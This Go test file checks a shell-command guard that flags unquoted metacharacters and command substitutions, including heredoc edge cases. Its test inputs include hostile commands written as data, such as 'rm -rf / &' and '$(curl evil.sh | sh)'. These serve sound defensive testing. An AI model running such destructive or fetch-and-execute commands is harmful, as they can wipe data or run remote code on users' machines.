package shellmeta

import "testing"

func TestContainsUnquotedMetachar_RejectsUnquoted(t *testing.T) {
	tests := []struct {
		name   string
		cmd    string
		wantCh byte
	}{
		{"semicolon", "echo a; echo b", ';'},
		{"pipe", "ls | grep foo", '|'},
		{"ampersand", "rm -rf / &", '&'},
		{"backtick", "echo `whoami`", '`'},
		{"newline", "echo a\n echo b", '\n'},
		{"carriage return", "echo a\r echo b", '\r'},
		{"pipe no spaces", "ls|grep foo", '|'},
		{"semicolon no space", "ls;rm", ';'},
		{"semicolon between quoted args", `echo "safe" ; echo "also"`, ';'},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got, ok := ContainsUnquotedMetachar(tc.cmd)
			if !ok {
				t.Fatalf("ContainsUnquotedMetachar(%q): want %c, got none", tc.cmd, tc.wantCh)
			}
			if got != tc.wantCh {
				t.Fatalf("ContainsUnquotedMetachar(%q): want %c, got %c", tc.cmd, tc.wantCh, got)
			}
		})
	}
}

func TestContainsUnquotedMetachar_AllowsQuoted(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
	}{
		{"semicolon in double quotes", `echo "hello; world"`},
		{"pipe in double quotes", `git log --format="%s|%an"`},
		{"ampersand in double quotes", `echo "foo & bar"`},
		{"backtick in single quotes", `echo '` + "`" + `whoami` + "`" + `'`},
		{"semicolon in single quotes", `echo 'hello; world'`},
		{"pipe in single quotes", `ssh host 'ls | grep foo'`},
		{"newline in single quotes", "echo 'hello\nworld'"},
		{"semicolon escaped outside quotes", `echo hello\; world`},
		{"pipe escaped outside quotes", `ls \| head`},
		{"quoted semicolon between quoted args", `echo "safe;also"`},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got, ok := ContainsUnquotedMetachar(tc.cmd)
			if ok {
				t.Fatalf("ContainsUnquotedMetachar(%q): unexpected metachar %c", tc.cmd, got)
			}
		})
	}
}

func TestContainsUnquotedMetachar_TrueBlocksFalsePositives(t *testing.T) {
	// These are commands that the OLD naive scanner (strings.IndexAny)
	// would have INCORRECTLY blocked, but the new parser allows through.
	// Git commit message with semicolon-like chars in the message.
	if _, ok := ContainsUnquotedMetachar(`git commit -m "feat: add feature; fix: bug"`); ok {
		t.Error("semicolon inside double-quoted commit message should not be flagged")
	}
	// Docker command with escaped quotes and args.
	if _, ok := ContainsUnquotedMetachar(`docker exec -it container sh -c "ls && pwd"`); ok {
		t.Error("pipe inside double quotes should not be flagged")
	}
}

func TestContainsUnquotedMetachar_BacktickInDoubleQuotes(t *testing.T) {
	// Backtick IS command substitution inside double quotes.
	got, ok := ContainsUnquotedMetachar(`echo "` + "`" + `ls` + "`" + `"`)
	if !ok {
		t.Fatal("backtick inside double quotes should be flagged (it's command substitution)")
	}
	if got != '`' {
		t.Fatalf("want backtick, got %c", got)
	}
}

func TestContainsUnquotedMetachar_AllowsBenign(t *testing.T) {
	tests := []string{
		"git status",
		"ls -la",
		`echo "hello world"`,
		"cat /tmp/file.txt",
		"grep -r pattern .",
		`echo "it's fine"`,
		"python3 -c 'import os'",
		`ssh user@host -p 2222`,
	}
	for _, cmd := range tests {
		t.Run(cmd, func(t *testing.T) {
			if got, ok := ContainsUnquotedMetachar(cmd); ok {
				t.Fatalf("ContainsUnquotedMetachar(%q): unexpected metachar %c", cmd, got)
			}
		})
	}
}

func TestContainsUnquotedMetachar_EscapedChars(t *testing.T) {
	no := func(cmd string, name string) {
		t.Helper()
		t.Run(name, func(t *testing.T) {
			t.Helper()
			if got, ok := ContainsUnquotedMetachar(cmd); ok {
				t.Fatalf("should not find metachar in %q, got %c", cmd, got)
			}
		})
	}
	yes := func(cmd string, name string, want byte) {
		t.Helper()
		t.Run(name, func(t *testing.T) {
			t.Helper()
			if got, ok := ContainsUnquotedMetachar(cmd); !ok {
				t.Fatalf("should find metachar in %q", cmd)
			} else if got != want {
				t.Fatalf("got %c, want %c", got, want)
			}
		})
	}
	no(`echo hello\; world`, "escaped semicolon")
	no(`ls \| head`, "escaped pipe")
	// backtick after escaped backslash is literal, pipe after is real
	yes("echo \\` hi | head", "escaped backtick then real pipe", '|')
}

func TestContainsUnquotedMetachar_DoubleQuoteEscaping(t *testing.T) {
	// Escaped variants inside double quotes — backslash skips the next char
	// when it's one of the escape set ($, `, ", \, \n).
	no := func(cmd string) {
		t.Helper()
		if got, ok := ContainsUnquotedMetachar(cmd); ok {
			t.Fatalf("should not find metachar in %q, got %c", cmd, got)
		}
	}
	yes := func(cmd string) {
		t.Helper()
		if _, ok := ContainsUnquotedMetachar(cmd); !ok {
			t.Fatalf("should find metachar in %q", cmd)
		}
	}
	// escaped double-quote inside double-quote: \" is literal "
	no("echo \"hello \\\" world\"")
	// escaped dollar inside double-quote
	no("echo \"cost \\$10\"")
	// real backtick inside double-quote IS command substitution
	yes("echo \"hello `whoami`\"")
}

func TestContainsUnquotedMetachar_AllowsFdRedirects(t *testing.T) {
	// File-descriptor redirects use '&' but never introduce a second
	// command — the token next to '&' is an fd number, '-', or a filename
	// (a redirect target), never an executable. These were the dominant
	// false-positive class (every `go test ./... 2>&1` was hard-blocked).
	allow := []struct {
		name string
		cmd  string
	}{
		{"merge stderr into stdout", `go test ./... 2>&1`},
		{"merge both to file", `make build &> log.txt`},
		{"merge both append", `make build &>> log.txt`},
		{"dup stdout to stderr", `cmd >&2`},
		{"explicit fd dup", `cmd 1>&2`},
		{"input fd dup", `cmd 0<&3`},
		{"dup with space target", `cmd >& file`},
		{"close output fd", `cmd >&-`},
		{"close input fd", `cmd <&-`},
	}
	for _, tc := range allow {
		t.Run(tc.name, func(t *testing.T) {
			if got, ok := ContainsUnquotedMetachar(tc.cmd); ok {
				t.Fatalf("ContainsUnquotedMetachar(%q): fd-redirect '&' must not be flagged, got %c", tc.cmd, got)
			}
		})
	}
}

func TestContainsUnquotedMetachar_FdRedirectDoesNotMaskChaining(t *testing.T) {
	// Allowing the redirect '&' must NOT let a genuine chain that *follows*
	// a redirect slip through. The redirect '&' is skipped, but the real
	// chaining metachar later in the command is still flagged.
	block := []struct {
		name   string
		cmd    string
		wantCh byte
	}{
		{"redirect then logical-and", `cmd 2>&1 && other`, '&'},
		{"redirect then pipe", `./run 2>&1 | tee out`, '|'},
		{"redirect then semicolon", `cmd >&2; rm -rf /tmp/x`, ';'},
		{"redirect then background-and-chain", `cmd &>log & evil`, '&'},
		{"logical-and not a redirect", `cd x && y`, '&'},
		{"backgrounding stays blocked", `some-cmd &`, '&'},
	}
	for _, tc := range block {
		t.Run(tc.name, func(t *testing.T) {
			got, ok := ContainsUnquotedMetachar(tc.cmd)
			if !ok {
				t.Fatalf("ContainsUnquotedMetachar(%q): expected metachar %c, got none", tc.cmd, tc.wantCh)
			}
			if got != tc.wantCh {
				t.Fatalf("ContainsUnquotedMetachar(%q): want %c, got %c", tc.cmd, tc.wantCh, got)
			}
		})
	}
}

func TestContainsUnquotedMetachar_AllowsHeredocBodyMetachars(t *testing.T) {
	tests := []string{
		"cat <<EOF\nhello; world\nEOF",
		"cat <<'EOF'\nhello | world & friends\nEOF",
		"cat <<-EOF\n\tsemi; pipe|amp&\n\tEOF",
		"cat <<EOF > /tmp/out\nhello; world\nEOF",
	}
	for _, cmd := range tests {
		t.Run(cmd, func(t *testing.T) {
			if got, ok := ContainsUnquotedMetachar(cmd); ok {
				t.Fatalf("heredoc body metachar should not be flagged in %q, got %c", cmd, got)
			}
		})
	}
}

func TestContainsUnquotedMetachar_RejectsCommandAfterHeredoc(t *testing.T) {
	cmd := "cat <<EOF\nhello\nEOF\nrm -rf /tmp/nope"
	got, ok := ContainsUnquotedMetachar(cmd)
	if !ok {
		t.Fatal("expected command after heredoc to be rejected")
	}
	if got != '\n' {
		t.Fatalf("expected newline rejection after heredoc, got %c", got)
	}
}

func TestContainsUnquotedMetachar_MixedQuotes(t *testing.T) {
	// Command with mixed single/double quotes, metachar outside
	if _, ok := ContainsUnquotedMetachar(`echo 'a"b"c'; echo d`); !ok {
		t.Fatal("semicolon outside quotes must be flagged")
	}
	// Command where quotes protect then unprotect
	if _, ok := ContainsUnquotedMetachar(`echo 'safe' | head`); !ok {
		t.Fatal("pipe outside quotes must be flagged")
	}
	// Nested: double inside single is literal
	if _, ok := ContainsUnquotedMetachar(`echo '"safe" | head'`); ok {
		t.Fatal("pipe inside single quotes must not be flagged")
	}
}

func TestFindUnquotedSubstitution_RejectsUnquoted(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want string
	}{
		{"command sub", "echo $(whoami)", "$("},
		{"process sub in", "diff <(echo a) <(echo b)", "<("},
		{"process sub out", "tee >(gzip) < file", ">("},
		{"multi-arg sub", "cat $(find . -name '*.go')", "$("},
		{"chained sub", "echo $(a) | head", "$("},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := FindUnquotedSubstitution(tc.cmd)
			if got != tc.want {
				t.Fatalf("FindUnquotedSubstitution(%q): want %q, got %q", tc.cmd, tc.want, got)
			}
		})
	}
}

func TestFindUnquotedSubstitution_AllowsArithmetic(t *testing.T) {
	// $((...)) is arithmetic expansion, not command substitution.
	got := FindUnquotedSubstitution("echo $((1 + 1))")
	if got != "" {
		t.Fatalf("arithmetic expansion should not be flagged, got %q", got)
	}
}

func TestFindUnquotedSubstitution_IgnoresHeredocBody(t *testing.T) {
	cmd := "cat <<'EOF'\n$(whoami)\nEOF"
	if got := FindUnquotedSubstitution(cmd); got != "" {
		t.Fatalf("substitution inside heredoc body should be ignored, got %q", got)
	}

	cmd = "cat <<EOF\nplain\nEOF\necho $(whoami)"
	if got := FindUnquotedSubstitution(cmd); got != "$(" {
		t.Fatalf("substitution after heredoc should still be found, got %q", got)
	}
}

func TestFindUnquotedSubstitution_AllowsQuoted(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
	}{
		{"command sub in single quotes", `echo '$(whoami)'`},
		{"process sub in single quotes", `cat '<(echo a)'`},
		{"process sub out in double quotes", `tee ">(gzip)"`},
		{"git commit with parens", `git commit -m "feat: add feature (fixes #123)"`},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := FindUnquotedSubstitution(tc.cmd); got != "" {
				t.Fatalf("FindUnquotedSubstitution(%q): unexpected %q", tc.cmd, got)
			}
		})
	}
}

func TestFindUnquotedSubstitution_RejectsDoubleQuotedCommandSub(t *testing.T) {
	// $(...) IS command substitution inside double quotes.
	tests := []struct {
		name string
		cmd  string
	}{
		{"dq command sub", `echo "$(whoami)"`},
		{"dq command sub in string", `git log --format="$(git rev-parse HEAD)"`},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := FindUnquotedSubstitution(tc.cmd); got != "$(" {
				t.Fatalf("FindUnquotedSubstitution(%q): want $, got %q", tc.cmd, got)
			}
		})
	}
}

func TestFindUnquotedSubstitution_Escaped(t *testing.T) {
	if got := FindUnquotedSubstitution(`echo \(hello\)`); got != "" {
		t.Fatalf("escaped parens should not trigger substitution, got %q", got)
	}
	if got := FindUnquotedSubstitution(`echo \$(whoami)`); got != "" {
		t.Fatalf("escaped dollar should not trigger substitution, got %q", got)
	}
}

func TestFindUnquotedSubstitution_AllowsParamExpansion(t *testing.T) {
	// ${VAR} is parameter expansion, executes no command.
	if got := FindUnquotedSubstitution("echo ${HOME}/.config"); got != "" {
		t.Fatalf("parameter expansion should not be flagged, got %q", got)
	}
	if got := FindUnquotedSubstitution("cat ${HOME}/.config/app.toml"); got != "" {
		t.Fatalf("parameter expansion should not be flagged, got %q", got)
	}
}

// --- P0 regression: unquoted heredoc body substitution bypass ---
// Unquoted-delim heredocs (<<EOF not <<'EOF') perform $( ) / ` expansion
// on the body at parse time. The guard must flag subs inside them.

func TestFindUnquotedSubstitution_FlagsSubInUnquotedHeredocBody(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
	}{
		{"basic unquoted heredoc sub", "cat <<EOF\n$(whoami)\nEOF"},
		{"unquoted with leading dash", "cat <<-EOT\nrm -rf /tmp; $(curl evil.sh | sh)\nEOT"},
		{"unquoted sub after text", "cat <<DELIM\nprefix $(dangerous) suffix\nDELIM"},
		{"unquoted process sub in body", "cat <<EOF\ncat <(echo bad)\nEOF"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := FindUnquotedSubstitution(tc.cmd); got == "" {
				t.Fatalf("FindUnquotedSubstitution(%q) should flag substitution in unquoted heredoc body, got %q", tc.cmd, got)
			}
		})
	}
}

func TestContainsUnquotedMetachar_FlagsBacktickInUnquotedHeredocBody(t *testing.T) {
	cmd := "cat <<EOF\n`whoami`\nEOF"
	got, ok := ContainsUnquotedMetachar(cmd)
	if !ok || got != '`' {
		t.Fatalf("ContainsUnquotedMetachar(%q): want ` from unquoted heredoc body, got %c ok=%v", cmd, got, ok)
	}
}

func TestFindUnquotedSubstitution_IgnoresSubInQuotedHeredocBody(t *testing.T) {
	// Quoted delims keep body literal: safe to ignore subs (existing + explicit)
	tests := []string{
		"cat <<'EOF'\n$(whoami)\nEOF",
		"cat <<\"EOF\"\n$(whoami)\nEOF",
		"cat <<'EOT'\n`danger`\nEOT",
		"cat <<- 'EOF'\n$(safe)\nEOF",
	}
	for _, cmd := range tests {
		t.Run(cmd, func(t *testing.T) {
			if got := FindUnquotedSubstitution(cmd); got != "" {
				t.Fatalf("FindUnquotedSubstitution(%q): quoted heredoc body sub must be ignored (literal), got %q", cmd, got)
			}
		})
	}
}

func TestContainsUnquotedMetachar_AllowsMetacharsInUnquotedHeredocBody(t *testing.T) {
	// ; | & inside unquoted body are data (not chains); still allowed (as before)
	cmds := []string{
		"cat <<EOF\nhello; world | and & friends\nEOF",
		"cat <<-X\nline with ; | &\nX",
	}
	for _, cmd := range cmds {
		if got, ok := ContainsUnquotedMetachar(cmd); ok {
			t.Fatalf("ContainsUnquotedMetachar(%q): body metachars in heredoc must not be flagged (data), got %c", cmd, got)
		}
	}
}
